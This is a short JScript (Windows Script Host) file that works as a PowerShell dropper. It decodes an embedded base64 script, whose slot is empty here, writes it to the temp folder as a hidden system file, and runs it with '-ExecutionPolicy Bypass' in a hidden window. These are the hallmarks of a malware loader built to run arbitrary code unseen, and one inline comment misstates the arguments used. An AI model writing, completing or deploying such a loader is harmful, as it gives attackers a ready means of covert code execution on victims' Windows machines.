(function () {
    var ps1Base64 = "";

    function base64ToBytes(base64) {
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var output = [];
        var buffer = 0, bits = 0;
        for (var i = 0; i < base64.length; i++) {
            var c = base64.charAt(i);
            if (c === "=") break;
            var val = chars.indexOf(c);
            if (val < 0) continue;
            buffer = (buffer << 6) | val;
            bits += 6;
            if (bits >= 8) {
                bits -= 8;
                output.push((buffer >> bits) & 0xFF);
            }
        }
        return output;
    }

    function bytesToString(bytes) {
        var chunkSize = 0x8000; // 32KB
        var result = [];
        for (var i = 0; i < bytes.length; i += chunkSize) {
            var chunk = bytes.slice(i, i + chunkSize);
            result.push(String.fromCharCode.apply(null, chunk));
        }
        return result.join("");
    }

    var decodedScript = bytesToString(base64ToBytes(ps1Base64));

    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var temp = fso.GetSpecialFolder(2) + "\\" + "decoded.ps1";
    var ts = fso.CreateTextFile(temp, true);
    ts.Write(decodedScript);
    ts.Close();

    var file = fso.GetFile(temp);
    file.Attributes = file.Attributes | 2 | 4;

    // 🔹 Run PowerShell to execute the saved script
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = 'powershell.exe -ExecutionPolicy Bypass -File "' + temp + '"';
    shell.Run(cmd, 0, true); // 1 = normal window, false = don’t wait
})();
